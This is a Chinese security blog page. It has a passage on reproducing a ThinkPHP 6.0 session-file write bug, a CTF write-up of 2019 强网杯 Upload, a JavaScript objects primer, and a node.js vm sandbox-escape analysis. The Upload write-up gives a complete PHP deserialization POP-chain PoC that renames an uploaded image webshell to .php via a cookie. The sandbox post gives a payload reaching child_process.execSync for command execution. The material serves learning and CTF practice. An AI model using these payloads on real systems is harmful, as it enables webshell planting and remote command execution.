<p>但是他的很多表和库的信息我们都不清楚–。。。。所以还是老老实实重新安装整个框架了。。<br><a target="_blank" rel="noopener" href="https://www.kancloud.cn/manual/thinkphp6_0/1037481">https://www.kancloud.cn/manual/thinkphp6_0/1037481</a><br>这里降级的时候一直没弄好，不懂是为啥，用了其他的安装和降级指令才行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">composer create-project topthink&#x2F;think tp60</span><br></pre></td></tr></table></figure>

<p>修改composer.json里面的”topthink/frameword”为6.0.0</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210715140505.png" alt="img" style="zoom:67%;">
去掉前面你的注释符，开启session
然后更改apache的根目录为框架里面的public目录

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210715134244.png" alt="img" style="zoom:67%;">
创建成功：
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210715140701.png" alt="img" style="zoom: 33%;">
果然最难的就是环境的配置--
接下来修改一下:tp60\app\controller\的index.php文件使他可以创建session
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210715140937.png" alt="img" style="zoom:67%;">

<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>根据漏洞描述，是因为session可控，传入的session值最后会拼接在sess_后形成任意文件读取覆盖，所以这里我们就直接跟进session值的传入。<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210715155925.png" alt="img" style="zoom:67%;"><br>进入session.php观察如何进行文件写入</p>
<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210715161558.png" alt="img"><br>跟进以后发现无过滤，只要长度符合32位就对sessionID进行赋值<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210715161834.png" alt="img"></p>
<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210715164037.png" alt="img"><br>接下来进行save()函数进行session的保存，可以看到write函数，将data写入sessionID中<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210715162555.png" alt="img"></p>
<p>将sessionid和sess_进行拼接形成新的文件名存放在/runtime/session/路径中<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210715164437.png" alt="img" style="zoom:67%;"></p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210715164440.png" alt="img" style="zoom:67%;">

<p>将传入的data值，写入改session文件中<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210715164822.png" alt="img" style="zoom:67%;"><br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210715164821.png" alt="img" style="zoom:67%;"></p>
<p>但是由于我网站根目录设置的是public，懒得再弄了，被配置环境弄怕了–<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210715170513.png" alt="img" style="zoom:67%;"></p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210715170514.png" alt="img" style="zoom:50%;">

<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>啊 无语了，想说换成phpstudy继承的，但是发现没有适合的php版本于是就又换了回去，期间debug的更换配置也是让人很头疼，最后瞎配置 也总算是配置好了–，真的是有点傻了<br>说一下第一次审计的收获<br>1.使用ctrl加鼠标左键可以直接看该函数的出现的位置<br>2.可以右键单击某个值添加观察追踪其改变位置<br>3.根据出问题的功能追踪其功能</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/07/13/2019%E5%BC%BA%E7%BD%91%E6%9D%AFupload/">2019强网杯upload</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-07-13</time><div class="content"><h2 id="强网杯-2019-Upload"><a href="#强网杯-2019-Upload" class="headerlink" title="[强网杯 2019]Upload"></a>[强网杯 2019]Upload</h2><p><a href="http://www.tar.gz有他的源码，注册以后发现可以文件上传，审计一下他的文件上传功能：">www.tar.gz有他的源码，注册以后发现可以文件上传，审计一下他的文件上传功能：</a><br>将上传的文件的后缀更改为png</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210716082418.png" alt="img" style="zoom:67%;">

<p>然后使用getimagesize检查文件头是否为图片</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210716082534.png" alt="img" style="zoom:67%;">

<p>文件上传这里似乎没有太多机会，可能需要哪里辅助一下<br>这里有个反序列化函数，可以对profile进行赋值</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210716084205.png" alt="img" style="zoom:67%;">
底下有两个魔术方法:
get：读取不可访问或不存在的属性时调用
call：调用不可访问或不存在的方法时调用
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210716085443.png" alt="img" style="zoom:67%;">

<p>看了一下其他地方发现有个destruct方法<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210716102445.png" alt="img" style="zoom:67%;"></p>
<h3 id="思路整理"><a href="#思路整理" class="headerlink" title="思路整理"></a>思路整理</h3><p>1.文件上传的限制在于后缀名会被强制更改为png<br>2.可以对cookie的值进行反序列化，会触发get、call魔术方法调用不存在的属性和方法对profile进行重新赋值操作<br>3.如何将profile和更换文件后缀联系在一起呢？<br>——————————————————————<br>我们可以看到在upload_img()函数中有一个copy函数，将filename_tmp的值赋给了filename。那么思路就是这样：<br>1.先上传一个图片马<br>2.然后通过cookie传入反序列化内容，其中反序列化的思路应该是这样的:<br>为了使用call和get方法，所以我们要调用没有的属性和方法，profile.php中没有register中的方法，所以这里就可以先写一波:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$registed&#x3D;new Register();</span><br><span class="line">$registed-&gt;registed&#x3D;false;</span><br><span class="line">$registed-&gt;checker&#x3D;$profiled;</span><br></pre></td></tr></table></figure>

<p>接下来就会调用profile里面的get和call方法:<br>首先会调用call方法因为index方法不存在再profile类里面，因为我们的目的是利用call方法调用upload_img()，所以我们需要利用get方法对name赋值，由于get是调用不存在的属性，所以我们这里依旧是利用index来作为一个跳板置换成upload_img(),然后有几个判断是我们需要绕过的，其中包括检查ext是否为png</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$profiled&#x3D;new Profile();</span><br><span class="line">$profiled-&gt;except&#x3D;[&#39;index&#39;&#x3D;&gt;&#39;upload_img&#39;];</span><br><span class="line">$profiled-&gt;ext&#x3D;&quot;png&quot;;</span><br><span class="line">$profiled-&gt;filename&#x3D;&quot;&#x2F;upload&#x2F;7792cab172a46cd0ff2d8d7fae734ba2&#x2F;8111.php&quot;;</span><br><span class="line">$profiled-&gt;filename_tmp&#x3D;&quot;&#x2F;upload&#x2F;7792cab172a46cd0ff2d8d7fae734ba2&#x2F;8383c2ba7b9a26c39fbe4c61bf398ed4.php&quot;;</span><br></pre></td></tr></table></figure>

<p>完整的poc如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $checker;</span><br><span class="line">    <span class="keyword">public</span> $filename_tmp;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">    <span class="keyword">public</span> $upload_menu;</span><br><span class="line">    <span class="keyword">public</span> $ext;</span><br><span class="line">    <span class="keyword">public</span> $img;</span><br><span class="line">    <span class="keyword">public</span> $except;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params">$name</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;except[$name];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params">$name, $arguments</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;&#123;$name&#125;) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;&#123;$name&#125;&#125;($arguments);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Register</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $checker;</span><br><span class="line">        <span class="keyword">public</span> $registed;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;registed)&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;checker-&gt;index();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">$profiled=<span class="keyword">new</span> Profile();</span><br><span class="line">$profiled-&gt;except=[<span class="string">&#x27;index&#x27;</span>=&gt;<span class="string">&#x27;upload_img&#x27;</span>];</span><br><span class="line">$profiled-&gt;ext=<span class="string">&quot;png&quot;</span>;</span><br><span class="line">$profiled-&gt;filename=<span class="string">&quot;/upload/7792cab172a46cd0ff2d8d7fae734ba2/8111.php&quot;</span>;</span><br><span class="line">$profiled-&gt;filename_tmp=<span class="string">&quot;/upload/7792cab172a46cd0ff2d8d7fae734ba2/8383c2ba7b9a26c39fbe4c61bf398ed4.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">$registed=<span class="keyword">new</span> Register();</span><br><span class="line">$registed-&gt;registed= <span class="literal">false</span>;</span><br><span class="line">$registed-&gt;checker=$profiled;</span><br><span class="line"><span class="keyword">echo</span> urlencode(base64_encode(serialize($registed)));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这是我在本地构建的，将所有用到的类整合到一个文件里面，方便进行调试查看赋值过程，否则还需要在开头再加上:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">web</span>\<span class="title">controller</span>;</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br></pre></td></tr></table></figure>

<p>将序列化后的内容使用cookie传入即可，前提是先上传一个文件马</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210717103343.png" alt="img" style="zoom:67%;">
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210717103345.png" alt="img" style="zoom:67%;">

</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/07/13/%E8%AE%BAjs%E7%9A%84%E5%AF%B9%E8%B1%A1/">论js的对象</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-07-13</time><div class="content"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>发现学习node.js的沙盒逃逸时，对象的概念也需要理解一下。</p>
<h2 id="什么是js"><a href="#什么是js" class="headerlink" title="什么是js"></a>什么是js</h2><p>js就是javascript，js里面一切皆对象，理解对象是理解js语言的关键</p>
<h2 id="封装、继承、多态"><a href="#封装、继承、多态" class="headerlink" title="封装、继承、多态"></a>封装、继承、多态</h2><p>在C++/Java等传统面向对象编程中，类（class）是对象（object）的模板，class不占用内存空间，object占用内存，object也称为class instance，同一个class可以被new出很多个object。</p>
<p>Javascript语言不支持”类”，但Javascript仍然是面向对象语言，面向对象的3要素在JavaScript里都支持:</p>
<ul>
<li>封装 - 数据与方法封装在一起，方法可以操作数据，这就是JS里的object</li>
<li>继承 - 新创建的对象可以继承父对象的数据和方法，js里有多种方法实现继承，譬如原型方式继承，拷贝继承等</li>
<li>多态 - 一个接口有多种实现</li>
</ul>
<p>实际上，js里一切皆对象。</p>
<h2 id="什么是对象"><a href="#什么是对象" class="headerlink" title="什么是对象"></a>什么是对象</h2><p>js里的对象（object）就是一组键值(name-value)的集合, name总是string类型, value可以是各种类型, 可以是基本数据类型, 可以是数组或其他对象, 也可以是函数, object很像是一个hash map. object里的name-value是无序的。</p>
<p>对象是动态的，可以动态地增加属性和方法。</p>
<h2 id="对象属性"><a href="#对象属性" class="headerlink" title="对象属性"></a>对象属性</h2><h3 id="属性特性"><a href="#属性特性" class="headerlink" title="属性特性"></a>属性特性</h3><p>每个属性都拥有4个特性，数据属性和访问器属性一共有6种属性特性:</p>
<ul>
<li>数据属性特有的特性:<ul>
<li><code>[[Value]]</code>: 属性的值.</li>
<li><code>[[Writable]]</code>: 控制属性的值是否可以改变.</li>
</ul>
</li>
<li>访问器属性特有的特性:<ul>
<li><code>[[Get]]</code>: 存储着getter方法.</li>
<li><code>[[Set]]</code>: 存储着setter方法.</li>
</ul>
</li>
<li>两种属性都有的特性:<ul>
<li><code>[[Enumerable]]</code>: 如果一个属性是不可枚举的,则在一些操作下,这个属性是不可见的,比如for…in和Object.keys()</li>
<li><code>[[Configurable]]</code>: 如果一个属性是不可配置的,则该属性的所有特性(除了%%[[Value]]%%)都不可改变</li>
</ul>
</li>
</ul>
<h3 id="对象的原型-prototype"><a href="#对象的原型-prototype" class="headerlink" title="对象的原型[[prototype]]"></a>对象的原型[[prototype]]</h3><p>在js中所有对象都有一个隐含的属性<code>[[prototype]]</code>指向其原型对象，原型对象也有自己的原型，如此下去便形成一个原型链，所有对象的原型链的顶层都是Object.prototype.</p>
<p>请注意，<code>[[prototype]]</code>并不是一个真实的属性名，因此无法通过这个属性名获得原型对象，但js提供了方法来读取和判断对象的原型:</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 接前面的例子</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Object</span>.getPrototypeOf(myFather) === Person.prototype); <span class="comment">//true</span></span><br><span class="line"><span class="built_in">console</span>.log(Person.prototype.isPrototypeOf(myFather)); <span class="comment">//true</span></span><br><span class="line"><span class="built_in">console</span>.log(Person.prototype.isPrototypeOf(myMother)); <span class="comment">//false</span></span><br></pre></td></tr></table></figure>

<p>对象的原型链通常是只读的，用户无法修改某个对象的原型，所以无法修改对象的继承关系。</p>
<h4 id="属性proto"><a href="#属性proto" class="headerlink" title="属性proto"></a>属性<strong>proto</strong></h4><p>在js规范里，对象原型通常是不可见的属性，因此无法直接访问。但某些浏览器里支持<code>__proto__</code>属性，firefox/chrome/safari/nodejs都支持<code>__proto__</code>属性，在这些浏览器里对象原型是可见的，可以直接访问对象的<code>__proto__</code>属性得到对象原型，也可以通过修改对象的<code>__proto__</code>属性来修改对象的原型链。</p>
<p>ECMAScript 6正在讨论把<code>__proto__</code>属性标准化，但目前属性<code>__proto__</code>还不是标准。</p>
<p>本文接下来提到的<code>__proto__</code>, <code>[[prototype]]</code>都是指一个意思，即自身对象里指向其原型对象的属性。</p>
<h4 id="prototype"><a href="#prototype" class="headerlink" title="prototype"></a>prototype</h4><p>函数也是对象，所以函数也有属性<code>__proto__</code>，通过字面量声明的函数其原型对象是Function.prototype，当然Function.prototype的原型对象是Object.prototype.</p>
<p>函数还有一个特有的属性<code>prototype</code>，每个函数都有一个prototype属性（特别注意，prototype属性是函数对象特有的属性，不要和js中每个对象到其原型的连接相混淆，那个是隐藏的，只是在firefox/chrome等浏览器中你可以使用<code>__proto__</code>访问到）</p>
<h5 id="constructor-NaN"><a href="#constructor-NaN" class="headerlink" title="constructor"></a>constructor</h5><h6 id="Object-prototype-constructor"><a href="#Object-prototype-constructor" class="headerlink" title="Object.prototype.constructor"></a>Object.prototype.constructor</h6><p>返回创建实例对象的 <a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object"><code>Object</code></a> 构造函数的引用。注意，此属性的值是对函数本身的引用，而不是一个包含函数名称的字符串。对原始类型来说，如<code>1</code>，<code>true</code>和<code>&quot;test&quot;</code>，该值只可读。</p>
<h6 id="详情"><a href="#详情" class="headerlink" title="详情"></a>详情</h6><p>所有对象都会从它的原型上继承一个constructor属性:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> o = &#123;&#125;;</span><br><span class="line">o.constructor === <span class="built_in">Object</span>; <span class="comment">// true</span></span><br></pre></td></tr></table></figure>

<h6 id="示例"><a href="#示例" class="headerlink" title="示例:"></a>示例:</h6><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Tree</span>(<span class="params">name</span>)</span>&#123;</span><br><span class="line"><span class="built_in">this</span>.name=name;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> theTree=<span class="keyword">new</span> Tree(<span class="string">&quot;Redwood&quot;</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;theTree.constructor is &quot;</span>+the Tree.constructor);</span><br><span class="line"><span class="comment">//打印输出</span></span><br><span class="line">theTree.constructor is <span class="function"><span class="keyword">function</span> <span class="title">Tree</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.name = name;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>大概整理一下js的对象的一些基础概念，<br>1.每个对象都有[[prototype]]属性，是用来指向自己的原型对象<br>2.所有对象的[[prototype]]是_proto_，而函数有一个特有的属性是prototype<br>3.prototype有个属性是constructor指向其原型对象的，可以进行调用。</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/07/13/node-js%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E5%88%86%E6%9E%90/">node.js沙盒逃逸分析</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-07-13</time><div class="content"><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>在日常开发中，会在业务代码中直接使用eval/function/vm等功能，其中 eval/Function 算是动态执行 JS，但无法屏蔽当前执行环境的上下文，但node.js 里提供了 vm 模块，相当于一个虚拟机，可以让你在执行代码时候隔离当前的执行环境，避免被恶意代码攻击。</p>
<h2 id="沙盒简介"><a href="#沙盒简介" class="headerlink" title="沙盒简介"></a>沙盒简介</h2><p>沙盒的特点在于很好的系统隔离性，在某种程度上，沙盒sandbox可以视为一个容器container，application运行在沙盒中，沙盒运行在windows操作系统上运行在沙盒中的application和沙盒外的application一样可以访问硬盘中的文件等资源。运行在沙盒中的application和沙盒外的application的主要区别在于：</p>
<ol>
<li><p>对于沙盒外的application而言，沙盒内的application是透明的（即不可见的）；</p>
</li>
<li><p>当沙盒内的application退出后，所做的<strong>更改将不会被保存</strong>。</p>
</li>
</ol>
<p>一个很好的例子是：当沙盒内的application退出后，沙盒内的application已下载或“安装”的恶意软件都将被丢弃。</p>
<p>总而言之，<strong>沙盒就是一个可以让你相对安全执行代码的环境</strong></p>
<h2 id="沙盒逃逸"><a href="#沙盒逃逸" class="headerlink" title="沙盒逃逸"></a>沙盒逃逸</h2><p>首先来一段沙盒逃逸的实例，直接进行分析：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&#x27;vm&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> ctx = &#123;&#125;;</span><br><span class="line">vm.runInNewContext(<span class="string">&#x27;this.constructor.constructor(&quot;return process&quot;)().exit()&#x27;</span>, ctx);<span class="comment">//vm.runInNewContext是编译和运行里面的javascript代码，其中的ctx似乎是可控的，而this指向了ctx</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;Never gets executed.&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>以上事例大致可以拆分出:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">tmp=ctx.constructor<span class="comment">//object</span></span><br><span class="line">exec=tmp.constructor<span class="comment">//Function</span></span><br><span class="line">exec(<span class="string">&#x27;return Process&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>以上被称为原型链的方式完成逃逸，个人感觉可以和继承的思想联系在一起，有点类似但是又不同，<strong>大概是通过往前引用原型链，引用到沙箱外的函数，从而实现逃逸</strong>。</p>
<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210713120601.png" alt="img" style="zoom:50%;">
根据这个图片进行讲解，就是在vm上下文通过原型链的prototype属性向上链接引用function，引用到全局数据实现在沙盒内进行沙盒外的function的调用。

<h2 id="实例分析"><a href="#实例分析" class="headerlink" title="实例分析"></a>实例分析</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&#x27;vm&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> context = &#123;</span><br><span class="line">    animal: <span class="string">&#x27;cat&#x27;</span>,</span><br><span class="line">    count: <span class="number">2</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> script = <span class="keyword">new</span> vm.Script(<span class="string">`this`</span>);</span><br><span class="line">vm.createContext(context);</span><br><span class="line"><span class="keyword">var</span> result = script.runInContext(context);</span><br><span class="line"><span class="built_in">console</span>.log(result.Function == <span class="built_in">Function</span>); <span class="comment">//false</span></span><br></pre></td></tr></table></figure>

<p>其中<code>this</code>通过其__proto__属性指向的是主环境的Object.prototype，所以:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">this.constructor.constructor(&#39;return process&#39;)().mainModule.require(&#39;child_process&#39;).execSync(&#39;whoami&#39;).toString()</span><br></pre></td></tr></table></figure>

<p>1.通过this的原型链向上获得主环境的function<br>2.然后通过(‘return process’)()获得主环境process变量<br>3通过process.mainModule.require导入child_process模块，实现命令执行</p>
<h3 id="知识补充"><a href="#知识补充" class="headerlink" title="知识补充"></a>知识补充</h3><p><strong>process变量：</strong>是nodejs中的一个全局变量，<br>拿到这个环境变量，相当于此时是在主环境下进行函数的执行，类似偷梁换柱？</p>
<p><strong>child_process模块：</strong>提供了命令执行的方法</p>
<p><a target="_blank" rel="noopener" href="http://nodejs.cn/api/child_process.html#child_process_child_process">http://nodejs.cn/api/child_process.html#child_process_child_process</a><br><a target="_blank" rel="noopener" href="https://chinese.freecodecamp.org/forum/t/topic/587">https://chinese.freecodecamp.org/forum/t/topic/587</a><br><a target="_blank" rel="noopener" href="https://liotree.github.io/2020/04/29/vm2%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E5%88%86%E6%9E%90/">https://liotree.github.io/2020/04/29/vm2%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E5%88%86%E6%9E%90/</a></p>
</div><hr></div><nav id="pagination"><div class="pagination"><a class="extend prev" rel="prev" href="/page/4/"><i class="fa fa-chevron-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><span class="page-number current">5</span><a class="page-number" href="/page/6/">6</a><span class="space">&hellip;</span><a class="page-number" href="/page/16/">16</a><a class="extend next" rel="next" href="/page/6/"><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer><div class="layout" id="footer"><div class="copyright">&copy;2013 - 2021 By vague huang</div><div class="framework-info"><span>Driven - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span><span></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/lib/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.9.0"></script><script src="/js/fancybox.js?version=1.9.0"></script><script src="/js/sidebar.js?version=1.9.0"></script><script src="/js/copy.js?version=1.9.0"></script><script src="/js/fireworks.js?version=1.9.0"></script><script src="/js/transition.js?version=1.9.0"></script><script src="/js/scroll.js?version=1.9.0"></script><script src="/js/head.js?version=1.9.0"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false});</script></body></html>